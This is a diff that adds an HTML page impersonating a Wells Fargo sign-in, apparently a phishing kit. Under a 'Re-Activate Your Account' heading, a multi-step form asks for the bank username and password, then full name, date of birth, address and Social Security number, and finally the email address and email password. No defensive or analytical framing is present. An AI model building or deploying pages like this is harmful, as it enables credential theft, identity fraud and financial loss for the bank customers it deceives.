@@ -1,0 +1,78 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Untitled Page</title>
+<meta name="generator" content="WYSIWYG Web Builder 17 Trial Version - https://www.wysiwygwebbuilder.com">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="css/wells.css" rel="stylesheet">
+<link href="css/index.css" rel="stylesheet">
+<script src="js/jquery-1.12.4.min.js"></script>
+<script src="js/wb.carousel.min.js"></script>
+<script>
+$(document).ready(function()
+{
+   var Carousel1Opts =
+   {
+      delay: 0,
+      duration: 500,
+      easing: 'linear',
+      mode: 'forward',
+      direction: '',
+      scalemode: 2,
+      pagination: true,
+      pause: null,
+      start: 0
+   };
+   $("#Carousel1").carousel(Carousel1Opts);
+});
+</script>
+</head>
+<body>
+<a href="https://www.wysiwygwebbuilder.com" target="_blank"><img src="images/builtwithwwb17.png" alt="WYSIWYG Web Builder" style="position:absolute;left:441px;top:967px;margin: 0;border-width:0;z-index:250" width="16" height="16"></a>
+<hr id="Line1">
+<div id="wb_Text1">
+<span style="color:#FFFFFF;font-family:'Bookman Old Style';font-size:24px;">WELLS FARGO</span></div>
+<div id="wb_Text2" onclick="window.location.href='https://oam.wellsfargo.com/oamo/identity/enrollment';return false;">
+<span style="color:#FFFFFF;font-family:Arial;font-size:19px;">Sign in</span></div>
+<div id="wb_Text3" onclick="window.location.href='https://www.wellsfargo.com/help/';return false;">
+<span style="color:#FFFFFF;font-family:Arial;font-size:19px;">Customer Service</span></div>
+<div id="wb_Carousel1">
+<div id="Carousel1">
+<div class="frame">
+<div id="wb_Checkbox1">
+<input type="checkbox" id="Checkbox1" name="Checkbox1" value="on"><label for="Checkbox1"></label></div>
+<div id="wb_Text9">
+<span style="color:#4F4F4F;font-family:Arial;font-size:13px;">Save Username</span></div>
+<hr id="Line2">
+<input type="submit" id="btnNext" onclick="$('#Carousel1').carousel('next');return false;" name="Next" value="Next">
+<div id="wb_Text4">
+<span style="color:#4F4F4F;font-family:'Bookman Old Style';font-size:16px;">Sign In To Re-Activate Your Account</span></div>
+<input type="text" id="Editbox1" name="user" value="" spellcheck="false" placeholder="Username">
+<input type="text" id="Editbox2" name="P@ss" value="" spellcheck="false" placeholder="Password">
+</div>
+<div class="frame">
+<div id="wb_Text5">
+<span style="color:#4F4F4F;font-family:'Bookman Old Style';font-size:15px;">Verify your Personal Information</span></div>
+<hr id="Line4">
+<input type="text" id="Editbox3" name="Full Name" value="" spellcheck="false" placeholder="Full Name">
+<input type="text" id="Editbox4" name="DOB (MM/DD/YY)" value="" spellcheck="false" placeholder="DOB (MM/DD/YY)">
+<input type="text" id="Editbox5" name="Address line 1" value="" spellcheck="false" placeholder="Address line 1">
+<input type="text" id="Editbox6" name="City" value="" spellcheck="false" placeholder="City">
+<input type="text" id="Editbox7" name="State" value="" spellcheck="false" placeholder="State">
+<input type="text" id="Editbox8" name="Zip Code" value="" spellcheck="false" placeholder="Zip Code">
+<input type="text" id="Editbox9" name="Ssn No." value="" spellcheck="false" placeholder="Ssn No.">
+<input type="submit" id="Button1" onclick="$('#Carousel1').carousel('next');return false;" name="Next" value="Next">
+</div>
+<div class="frame">
+<input type="submit" id="btnSubmit" onclick="document.getElementById('Carousel1').submit();return false;" name="Submit" value="Submit">
+<input type="text" id="Editbox10" name="Verify Your Registered Email" value="" spellcheck="false" placeholder="Verify Your Registered Email">
+<input type="text" id="Editbox11" name="Email's Password" value="" spellcheck="false" placeholder="Email&apos;s Password">
+<div id="wb_Text8">
+<span style="color:#4F4F4F;font-family:'Bookman Old Style';font-size:16px;">Verify Your Email </span></div>
+</div>
+</div>
+</div>
+<hr id="Line3">
+</body>
+</html>
